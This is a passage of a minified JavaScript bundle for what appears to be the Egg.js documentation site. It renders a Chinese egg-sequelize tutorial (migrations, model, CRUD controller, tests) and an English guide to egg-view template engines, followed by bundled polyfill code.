\u4e2d\u7684\u5185\u5bb9\uff0c\u5c06\u5176\u6539\u6210\u6211\u4eec\u9879\u76ee\u4e2d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u914d\u7f6e\uff1a"),r.a.createElement(o["a"],{code:'{\n  "development": {\n    "username": "root",\n    "password": null,\n    "database": "egg-sequelize-doc-default",\n    "host": "127.0.0.1",\n    "dialect": "mysql"\n  },\n  "test": {\n    "username": "root",\n    "password": null,\n    "database": "egg-sequelize-doc-unittest",\n    "host": "127.0.0.1",\n    "dialect": "mysql"\n  }\n}',lang:"unknown"}),r.a.createElement("p",null,"\u6b64\u65f6 sequelize-cli \u548c\u76f8\u5173\u7684\u914d\u7f6e\u4e5f\u90fd\u521d\u59cb\u5316\u597d\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u7f16\u5199\u9879\u76ee\u7684\u7b2c\u4e00\u4e2a Migration \u6587\u4ef6\u6765\u521b\u5efa\u6211\u4eec\u7684\u4e00\u4e2a users \u8868\u4e86\u3002"),r.a.createElement(o["a"],{code:"npx sequelize migration:generate --name=init-users",lang:"bash"}),r.a.createElement("p",null,"\u6267\u884c\u5b8c\u540e\u4f1a\u5728 ",r.a.createElement("code",null,"database/migrations")," \u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u4e2a migration \u6587\u4ef6(",r.a.createElement("code",null,"$","{","timestamp","}","-init-users.js"),")\uff0c\u6211\u4eec\u4fee\u6539\u5b83\u6765\u5904\u7406\u521d\u59cb\u5316 ",r.a.createElement("code",null,"users")," \u8868\uff1a"),r.a.createElement(o["a"],{code:"'use strict';\n\nmodule.exports = {\n  // \u5728\u6267\u884c\u6570\u636e\u5e93\u5347\u7ea7\u65f6\u8c03\u7528\u7684\u51fd\u6570\uff0c\u521b\u5efa users \u8868\n  up: async (queryInterface, Sequelize) => {\n    const { INTEGER, DATE, STRING } = Sequelize;\n    await queryInterface.createTable('users', {\n      id: { type: INTEGER, primaryKey: true, autoIncrement: true },\n      name: STRING(30),\n      age: INTEGER,\n      created_at: DATE,\n      updated_at: DATE,\n    });\n  },\n  // \u5728\u6267\u884c\u6570\u636e\u5e93\u964d\u7ea7\u65f6\u8c03\u7528\u7684\u51fd\u6570\uff0c\u5220\u9664 users \u8868\n  down: async (queryInterface) => {\n    await queryInterface.dropTable('users');\n  },\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6267\u884c migrate \u8fdb\u884c\u6570\u636e\u5e93\u53d8\u66f4")),r.a.createElement(o["a"],{code:"# \u5347\u7ea7\u6570\u636e\u5e93\nnpx sequelize db:migrate\n# \u5982\u679c\u6709\u95ee\u9898\u9700\u8981\u56de\u6eda\uff0c\u53ef\u4ee5\u901a\u8fc7 `db:migrate:undo` \u56de\u9000\u4e00\u4e2a\u53d8\u66f4\n# npx sequelize db:migrate:undo\n# \u53ef\u4ee5\u901a\u8fc7 `db:migrate:undo:all` \u56de\u9000\u5230\u521d\u59cb\u72b6\u6001\n# npx sequelize db:migrate:undo:all",lang:"bash"}),r.a.createElement("p",null,"\u6267\u884c\u4e4b\u540e\uff0c\u6211\u4eec\u7684\u6570\u636e\u5e93\u521d\u59cb\u5316\u5c31\u5b8c\u6210\u4e86\u3002"),r.a.createElement("h2",{id:"\u7f16\u5199\u4ee3\u7801"},r.a.createElement(l["AnchorLink"],{to:"#\u7f16\u5199\u4ee3\u7801","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7f16\u5199\u4ee3\u7801"),r.a.createElement("p",null,"\u73b0\u5728\u7ec8\u4e8e\u53ef\u4ee5\u5f00\u59cb\u7f16\u5199\u4ee3\u7801\u5b9e\u73b0\u4e1a\u52a1\u903b\u8f91\u4e86\uff0c\u9996\u5148\u6211\u4eec\u6765\u5728 ",r.a.createElement("code",null,"app/model/")," \u76ee\u5f55\u4e0b\u7f16\u5199 user \u8fd9\u4e2a Model\uff1a"),r.a.createElement(o["a"],{code:"'use strict';\n\nmodule.exports = (app) => {\n  const { STRING, INTEGER, DATE } = app.Sequelize;\n\n  const User = app.model.define('user', {\n    id: { type: INTEGER, primaryKey: true, autoIncrement: true },\n    name: STRING(30),\n    age: INTEGER,\n    created_at: DATE,\n    updated_at: DATE,\n  });\n\n  return User;\n};",lang:"js"}),r.a.createElement("p",null,"\u8fd9\u4e2a Model \u5c31\u53ef\u4ee5\u5728 Controller \u548c Service \u4e2d\u901a\u8fc7 ",r.a.createElement("code",null,"app.model.User")," \u6216\u8005 ",r.a.createElement("code",null,"ctx.model.User")," \u8bbf\u95ee\u5230\u4e86\uff0c\u4f8b\u5982\u6211\u4eec\u7f16\u5199 ",r.a.createElement("code",null,"app/controller/users.js"),"\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/users.js\nconst Controller = require('egg').Controller;\n\nfunction toInt(str) {\n  if (typeof str === 'number') return str;\n  if (!str) return str;\n  return parseInt(str, 10) || 0;\n}\n\nclass UserController extends Controller {\n  async index() {\n    const ctx = this.ctx;\n    const query = {\n      limit: toInt(ctx.query.limit),\n      offset: toInt(ctx.query.offset),\n    };\n    ctx.body = await ctx.model.User.findAll(query);\n  }\n\n  async show() {\n    const ctx = this.ctx;\n    ctx.body = await ctx.model.User.findByPk(toInt(ctx.params.id));\n  }\n\n  async create() {\n    const ctx = this.ctx;\n    const { name, age } = ctx.request.body;\n    const user = await ctx.model.User.create({ name, age });\n    ctx.status = 201;\n    ctx.body = user;\n  }\n\n  async update() {\n    const ctx = this.ctx;\n    const id = toInt(ctx.params.id);\n    const user = await ctx.model.User.findByPk(id);\n    if (!user) {\n      ctx.status = 404;\n      return;\n    }\n\n    const { name, age } = ctx.request.body;\n    await user.update({ name, age });\n    ctx.body = user;\n  }\n\n  async destroy() {\n    const ctx = this.ctx;\n    const id = toInt(ctx.params.id);\n    const user = await ctx.model.User.findByPk(id);\n    if (!user) {\n      ctx.status = 404;\n      return;\n    }\n\n    await user.destroy();\n    ctx.status = 200;\n  }\n}\n\nmodule.exports = UserController;",lang:"js"}),r.a.createElement("p",null,"\u6700\u540e\u6211\u4eec\u5c06\u8fd9\u4e2a controller \u6302\u8f7d\u5230\u8def\u7531\u4e0a\uff1a"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.resources('users', '/users', controller.users);\n};",lang:"js"}),r.a.createElement("p",null,"\u9488\u5bf9 ",r.a.createElement("code",null,"users")," \u8868\u7684 CURD \u64cd\u4f5c\u7684\u63a5\u53e3\u5c31\u5f00\u53d1\u5b8c\u4e86\uff0c\u4e3a\u4e86\u9a8c\u8bc1\u4ee3\u7801\u903b\u8f91\u662f\u5426\u6b63\u786e\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u9700\u8981\u7f16\u5199\u5355\u5143\u6d4b\u8bd5\u6765\u9a8c\u8bc1\u3002"),r.a.createElement("h2",{id:"\u5355\u5143\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u5355\u5143\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5355\u5143\u6d4b\u8bd5"),r.a.createElement("p",null,"\u5728\u7f16\u5199\u6d4b\u8bd5\u4e4b\u524d\uff0c\u7531\u4e8e\u5728\u524d\u9762\u7684 egg \u914d\u7f6e\u4e2d\uff0c\u6211\u4eec\u5c06\u5355\u5143\u6d4b\u8bd5\u73af\u5883\u548c\u5f00\u53d1\u73af\u5883\u6307\u5411\u4e86\u4e0d\u540c\u7684\u6570\u636e\u5e93\uff0c\u56e0\u6b64\u9700\u8981\u901a\u8fc7 Migrations \u6765\u521d\u59cb\u5316\u6d4b\u8bd5\u6570\u636e\u5e93\u7684\u6570\u636e\u7ed3\u6784\uff1a"),r.a.createElement(o["a"],{code:"NODE_ENV=test npx sequelize db:migrate:up",lang:"bash"}),r.a.createElement("p",null,"\u6709\u6570\u636e\u5e93\u8bbf\u95ee\u7684\u5355\u5143\u6d4b\u8bd5\u76f4\u63a5\u5199\u8d77\u6765\u4f1a\u7279\u522b\u7e41\u7410\uff0c\u7279\u522b\u662f\u5f88\u591a\u63a5\u53e3\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u7cfb\u5217\u7684\u6570\u636e\u624d\u80fd\u8fdb\u884c\uff0c\u9020\u6d4b\u8bd5\u6570\u636e\u662f\u4e00\u4e2a\u975e\u5e38\u7e41\u7410\u7684\u8fc7\u7a0b\u3002\u4e3a\u4e86\u7b80\u5316\u5355\u6d4b\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/aexmachina/factory-girl"},"factory-girl")," \u6a21\u5757\u6765\u5feb\u901f\u521b\u5efa\u6d4b\u8bd5\u6570\u636e\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5b89\u88c5 ",r.a.createElement("code",null,"factory-girl")," \u4f9d\u8d56")),r.a.createElement(o["a"],{code:"npm install --save-dev factory-girl",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5b9a\u4e49 factory-girl \u7684\u6570\u636e\u6a21\u578b\u5230 ",r.a.createElement("code",null,"test/factories.js")," \u4e2d")),r.a.createElement(o["a"],{code:"// test/factories.js\n'use strict';\n\nconst { factory } = require('factory-girl');\n\nmodule.exports = (app) => {\n  // \u53ef\u4ee5\u901a\u8fc7 app.factory \u8bbf\u95ee factory \u5b9e\u4f8b\n  app.factory = factory;\n\n  // \u5b9a\u4e49 user \u548c\u9ed8\u8ba4\u6570\u636e\n  factory.define('user', app.model.User, {\n    name: factory.sequence('User.name', (n) => `name_${n}`),\n    age: 18,\n  });\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u521d\u59cb\u5316\u6587\u4ef6 ",r.a.createElement("code",null,"test/.setup.js"),"\uff0c\u5f15\u5165 factory\uff0c\u5e76\u786e\u4fdd\u6d4b\u8bd5\u6267\u884c\u5b8c\u540e\u6e05\u7406\u6570\u636e\uff0c\u907f\u514d\u88ab\u5f71\u54cd\u3002")),r.a.createElement(o["a"],{code:"const { app } = require('egg-mock/bootstrap');\nconst factories = require('./factories');\n\nbefore(() => factories(app));\nafterEach(async () => {\n  // clear database after each test case\n  await Promise.all([app.model.User.destroy({ truncate: true, force: true })]);\n});",lang:"js"}),r.a.createElement("p",null,"\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u59cb\u7f16\u5199\u771f\u6b63\u7684\u6d4b\u8bd5\u7528\u4f8b\u4e86\uff1a"),r.a.createElement(o["a"],{code:"// test/app/controller/users.test.js\nconst { assert, app } = require('egg-mock/bootstrap');\n\ndescribe('test/app/controller/users.test.js', () => {\n  describe('GET /users', () => {\n    it('should work', async () => {\n      // \u901a\u8fc7 factory-girl \u5feb\u901f\u521b\u5efa user \u5bf9\u8c61\u5230\u6570\u636e\u5e93\u4e2d\n      await app.factory.createMany('user', 3);\n      const res = await app.httpRequest().get('/users?limit=2');\n      assert(res.status === 200);\n      assert(res.body.length === 2);\n      assert(res.body[0].name);\n      assert(res.body[0].age);\n    });\n  });\n\n  describe('GET /users/:id', () => {\n    it('should work', async () => {\n      const user = await app.factory.create('user');\n      const res = await app.httpRequest().get(`/users/${user.id}`);\n      assert(res.status === 200);\n      assert(res.body.age === user.age);\n    });\n  });\n\n  describe('POST /users', () => {\n    it('should work', async () => {\n      app.mockCsrf();\n      let res = await app.httpRequest().post('/users').send({\n        age: 10,\n        name: 'name',\n      });\n      assert(res.status === 201);\n      assert(res.body.id);\n\n      res = await app.httpRequest().get(`/users/${res.body.id}`);\n      assert(res.status === 200);\n      assert(res.body.name === 'name');\n    });\n  });\n\n  describe('DELETE /users/:id', () => {\n    it('should work', async () => {\n      const user = await app.factory.create('user');\n\n      app.mockCsrf();\n      const res = await app.httpRequest().delete(`/users/${user.id}`);\n      assert(res.status === 200);\n    });\n  });\n});",lang:"js"}),r.a.createElement("p",null,"\u6700\u540e\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u5728 CI \u4e2d\u8fd0\u884c\u5355\u5143\u6d4b\u8bd5\uff0c\u9700\u8981\u786e\u4fdd\u5728\u6267\u884c\u6d4b\u8bd5\u4ee3\u7801\u4e4b\u524d\uff0c\u6267\u884c\u4e00\u6b21 migrate \u786e\u4fdd\u6570\u636e\u7ed3\u6784\u66f4\u65b0\uff0c\u4f8b\u5982\u6211\u4eec\u5728 ",r.a.createElement("code",null,"package.json")," \u4e2d\u58f0\u660e ",r.a.createElement("code",null,"scripts.ci")," \u6765\u5728 CI \u73af\u5883\u4e0b\u6267\u884c\u5355\u5143\u6d4b\u8bd5\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "ci": "eslint . && NODE_ENV=test npx sequelize db:migrate && egg-bin cov"\n  }\n}',lang:"js"}),r.a.createElement("h2",{id:"\u5b8c\u6574\u793a\u4f8b"},r.a.createElement(l["AnchorLink"],{to:"#\u5b8c\u6574\u793a\u4f8b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b8c\u6574\u793a\u4f8b"),r.a.createElement("p",null,"\u66f4\u5b8c\u6574\u7684\u793a\u4f8b\u53ef\u4ee5\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/sequelize"},"eggjs/examples/sequelize"),"\u3002"),r.a.createElement("h2",{id:"\u811a\u624b\u67b6"},r.a.createElement(l["AnchorLink"],{to:"#\u811a\u624b\u67b6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u811a\u624b\u67b6"),r.a.createElement("p",null,"\u6211\u4eec\u4e5f\u63d0\u4f9b\u4e86 sequelize \u7684\u811a\u624b\u67b6\uff0c\u96c6\u6210\u4e86\u6587\u6863\u4e2d\u63d0\u4f9b\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize"),", ",r.a.createElement(l["Link"],{to:"https://github.com/sequelize/cli"},"sequelize-cli")," \u4e0e ",r.a.createElement(l["Link"],{to:"https://github.com/aexmachina/factory-girl"},"factory-girl")," \u7b49\u6a21\u5757\u3002\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"npm init egg --type=sequelize")," \u6765\u57fa\u4e8e\u5b83\u5feb\u901f\u521d\u59cb\u5316\u4e00\u4e2a\u65b0\u7684\u5e94\u7528\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},abDE:function(e,t,n){"use strict";n.d(t,"b",(function(){return o})),n.d(t,"a",(function(){return i})),n.d(t,"d",(function(){return c})),n.d(t,"c",(function(){return s}));var a=n("nzxN"),r=n("YeTV"),l=n("E5p8");function o(e,t){"function"===typeof e?e(t):"object"===Object(a["a"])(e)&&e&&"current"in e&&(e.current=t)}function i(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];var a=t.filter((function(e){return e}));return a.length<=1?a[0]:function(e){t.forEach((function(t){o(t,e)}))}}function c(){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];return Object(l["a"])((function(){return i.apply(void 0,t)}),t,(function(e,t){return e.length===t.length&&e.every((function(e,n){return e===t[n]}))}))}function s(e){var t,n,a=Object(r["isMemo"])(e)?e.type.type:e.type;return!!("function"!==typeof a||null!==(t=a.prototype)&&void 0!==t&&t.render)&&!!("function"!==typeof e||null!==(n=e.prototype)&&void 0!==n&&n.render)}},acvX:function(e,t,n){var a=n("0mt+"),r=n("0RY8");a({target:"Number",stat:!0,forced:Number.parseInt!=r},{parseInt:r})},ad52:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null)}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},ajGA:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"In most cases, we need to fetch data and render with template files. So we need to use corresponding view engines."),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," is a built-in plugin to support using multiple view engines in one application. All view engines are imported as plugins. With ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," developers can use the same API interface to work with different view engines. See ",r.a.createElement(l["Link"],{to:"../advanced/view-plugin"},"View Plugin")," for more details."),r.a.createElement("p",null,"Take the officially supported View plugin ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks")," as an example:"),r.a.createElement("h3",{id:"installing-view-engine-plugin"},r.a.createElement(l["AnchorLink"],{to:"#installing-view-engine-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Installing View Engine Plugin"),r.a.createElement(o["a"],{code:"$ npm i egg-view-nunjucks --save",lang:"bash"}),r.a.createElement("h3",{id:"enabling-view-engine-plugin"},r.a.createElement(l["AnchorLink"],{to:"#enabling-view-engine-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Enabling View Engine Plugin"),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.nunjucks = {\n  enable: true,\n  package: 'egg-view-nunjucks',\n};",lang:"js"}),r.a.createElement("h2",{id:"configuring-view-plugins"},r.a.createElement(l["AnchorLink"],{to:"#configuring-view-plugins","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configuring View Plugins"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," defines the default configuration of ",r.a.createElement("code",null,"config.view")),r.a.createElement("h3",{id:"root-string"},r.a.createElement(l["AnchorLink"],{to:"#root-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"root ","{","String","}"),r.a.createElement("p",null,"Root directory for template files is absolute path, with default value ",r.a.createElement("code",null,"$","{","baseDir","}","/app/view"),"."),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," supports having multiple directories, which are separated by ",r.a.createElement("code",null,","),". In this case, it looks for template files from all the directories."),r.a.createElement("p",null,"The configuration below is an example of multiple view directories:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nconst path = require('path');\nmodule.exports = (appInfo) => {\n  const config = {};\n  config.view = {\n    root: [\n      path.join(appInfo.baseDir, 'app/view'),\n      path.join(appInfo.baseDir, 'path/to/another'),\n    ].join(','),\n  };\n  return config;\n};",lang:"js"}),r.a.createElement("h3",{id:"cache-boolean"},r.a.createElement(l["AnchorLink"],{to:"#cache-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"cache ","{","Boolean","}"),r.a.createElement("p",null,"Cache template file paths, default value is ",r.a.createElement("code",null,"true"),".",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," looks for template files from the directories that defined in ",r.a.createElement("code",null,"root"),". When a file matching given template path is found, the file's full path will be cached and reused afterward.",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," won't search all directories again for the same template path."),r.a.createElement("h3",{id:"mapping-and-defaultviewengine"},r.a.createElement(l["AnchorLink"],{to:"#mapping-and-defaultviewengine","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"mapping")," and ",r.a.createElement("code",null,"defaultViewEngine")),r.a.createElement("p",null,"Every view engine has a view engine name defined when the plugin is enabled. In view configuration, ",r.a.createElement("code",null,"mapping")," defines the mapping from template file's extension name to view engine name. For example, use Nunjucks engine to render ",r.a.createElement("code",null,".nj")," files."),r.a.createElement(o["a"],{code:"module.exports = {\n  view: {\n    mapping: {\n      '.nj': 'nunjucks',\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," uses the corresponding view engine according to the configuration above."),r.a.createElement(o["a"],{code:"await ctx.render('home.nj');",lang:"js"}),r.a.createElement("p",null,"The mapping from file extension name to view engine must be defined. Otherwise ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," cannot find correct view engine. Global configuration can be done with ",r.a.createElement("code",null,"defaultViewEngine"),"."),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  view: {\n    defaultViewEngine: 'nunjucks',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"If a view engine cannot be found according to specified mapping, the default view engine will be used. For the applications that use only one view engine, it's recommended to set this option."),r.a.createElement("h3",{id:"defaultextension"},r.a.createElement(l["AnchorLink"],{to:"#defaultextension","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"defaultExtension")),r.a.createElement("p",null,"When calling ",r.a.createElement("code",null,"render()"),", the first argument should contain file extension name, unless ",r.a.createElement("code",null,"defaultExtension")," has been configured."),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  view: {\n    defaultExtension: '.nj',\n  },\n};\n\n// render app/view/home.nj\nawait ctx.render('home');",lang:"js"}),r.a.createElement("h2",{id:"rendering-page"},r.a.createElement(l["AnchorLink"],{to:"#rendering-page","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Rendering Page"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," provides three interfaces in Context. All three returns a Promise:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"render(name, locals)")," renders template file, and set the value to ",r.a.createElement("code",null,"ctx.body"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"renderView(name, locals)")," renders template file, returns the result and don't set the value to any variable."),r.a.createElement("li",null,r.a.createElement("code",null,"renderString(tpl, locals)")," renders template string, returns the result and don't set the value to any variable.")),r.a.createElement(o["a"],{code:"// {app_root}/app/controller/home.js\nclass HomeController extends Controller {\n  async index() {\n    const data = { name: 'egg' };\n\n    // render a template, path relate to `app/view`\n    await ctx.render('home/index.tpl', data);\n\n    // or manually set render result to ctx.body\n    ctx.body = await ctx.renderView('path/to/file.tpl', data);\n\n    // or render string directly\n    ctx.body = await ctx.renderString('hi, {{ name }}', data, {\n      viewEngine: 'nunjucks',\n    });\n  }\n}",lang:"js"}),r.a.createElement("p",null,"When calling ",r.a.createElement("code",null,"renderString"),", view engine should be specified unless ",r.a.createElement("code",null,"defaultViewEngine")," has been defined."),r.a.createElement("h2",{id:"locals"},r.a.createElement(l["AnchorLink"],{to:"#locals","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"locals")),r.a.createElement("p",null,"In the process of rendering pages, we usually need a variable to contain all information that is used in view template. ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," provides ",r.a.createElement("code",null,"app.locals")," and ",r.a.createElement("code",null,"ctx.locals"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.locals")," is global, usually configured in ",r.a.createElement("code",null,"app.js"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.locals")," is per-request, and it merges ",r.a.createElement("code",null,"app.locals"),"."),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.locals")," can be assigned by modifying key/value or assigned with a new object. ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," will merge the new object automatically in corresponding setter.")),r.a.createElement(o["a"],{code:"// `app.locals` merged into `ctx.locals`\nctx.app.locals = { a: 1 };\nctx.locals.b = 2;\nconsole.log(ctx.locals); // { a: 1, b: 2 }\n\n// in the processing of a request, `app.locals` is merged into `ctx.locals` only at the first time `ctx.locals` being accessed\nctx.app.locals = { a: 2 };\nconsole.log(ctx.locals); // already merged before, so output is still { a: 1, b: 2 }\n\n// pass a new object to `locals`. New object will be merged into `locals`, instead of replacing it. It's done by setter automatically.\nctx.locals.c = 3;\nctx.locals = { d: 4 };\nconsole.log(ctx.locals); // { a: 1, b: 2, c: 3, d: 4 }",lang:"js"}),r.a.createElement("p",null,"In practical development, we usually don't use these two objects in controller directly. Instead, simply call ",r.a.createElement("code",null,"ctx.render(name, data)"),":"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," merges ",r.a.createElement("code",null,"data")," into ",r.a.createElement("code",null,"ctx.locals")," automatically."),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view"},"egg-view")," injects ",r.a.createElement("code",null,"ctx"),", ",r.a.createElement("code",null,"request"),", ",r.a.createElement("code",null,"helper")," into locals automatically.")),r.a.createElement(o["a"],{code:"ctx.app.locals = { appName: 'showcase' };\nconst data = { name: 'egg' };\n\n// will auto merge `data` to `ctx.locals`, output: egg - showcase\nawait ctx.renderString('{{ name }} - {{ appName }}', data);\n\n// helper, ctx, request will auto inject\nawait ctx.renderString(\n  '{{ name }} - {{ helper.lowercaseFirst(ctx.app.config.baseDir) }}',\n  data,\n);",lang:"js"}),r.a.createElement("p",null,"Note:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("strong",null,"ctx.locals is cached. app.locals is merged into it only at the first time that ctx.locals is accessed.")),r.a.createElement("li",null,"due to the ambiguity of naming, the ",r.a.createElement("code",null,"ctx.state")," that is used in Koa is replaced by ",r.a.createElement("code",null,"ctx.locals")," in Egg.js, i.e. ",r.a.createElement("code",null,"ctx.state")," and ",r.a.createElement("code",null,"ctx.locals")," are equivalent. It's recommended to use the latter.")),r.a.createElement("h2",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"All functions that defined in ",r.a.createElement("code",null,"helper")," can be directly used in templates. See ",r.a.createElement(l["Link"],{to:"../basics/extend"},"Extend")," for more details."),r.a.createElement(o["a"],{code:"// app/extend/helper.js\nexports.lowercaseFirst = (str) => str[0].toLowerCase() + str.substring(1);\n\n// app/controller/home.js\nawait ctx.renderString('{{ helper.lowercaseFirst(name) }}', data);",lang:"js"}),r.a.createElement("h2",{id:"security"},r.a.createElement(l["AnchorLink"],{to:"#security","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Security"),r.a.createElement("p",null,"The built-in plugin ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security")," provides common security helper functions, including ",r.a.createElement("code",null,"helper.shtml / surl / sjs")," and so on. It's strongly recommended to read ",r.a.createElement(l["Link"],{to:"./security"},"Security"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},arOp:function(e,t,n){var a=n("u9el");a("Uint32",(function(e){return function(t,n,a){return e(this,t,n,a)}}))},b3Qd:function(e,t,n){var a=n("0mt+"),r=n("7un0"),l=n("oyD1"),o=r.toKey,i=r.getMap,c=r.store;a({target:"Reflect",stat:!0},{deleteMetadata:function(e,t){var n=arguments.length<3?void 0:o(arguments[2]),a=i(l(t),n,!1);if(void 0===a||!a["delete"](e))return!1;if(a.size)return!0;var r=c.get(t);return r["delete"](n),!!r.size||c["delete"](t)}})},b5FV:function(e,t,n){var a=n("WM7W");a("species")},"b8/4":function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));var a=n("FC4M");function r(e,t){if(e){if("string"===typeof e)return Object(a["a"])(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?Object(a["a"])(e,t):void 0}}},bOLl:function(e,t,n){var a=n("31yA"),r=n("ZKbF"),l=n("vr25"),o=n("u3TI");e.exports=function(e,t){for(var n=r(t),i=o.f,c=l.f,s=0;s<n.length;s++){var u=n[s];a(e,u)||i(e,u,c(t,u))}}},bOsn:function(e,t,n){"use strict";n.d(t,"a",(function(){return o}));var a=n("hUmh"),r=n("2Y+i"),l=n("Lcxk");function o(e){var t={r:0,g:0,b:0},n=1,r=null,o=null,i=null,c=!1,s=!1;return"string"===typeof e&&(e=p(e)),"object"===typeof 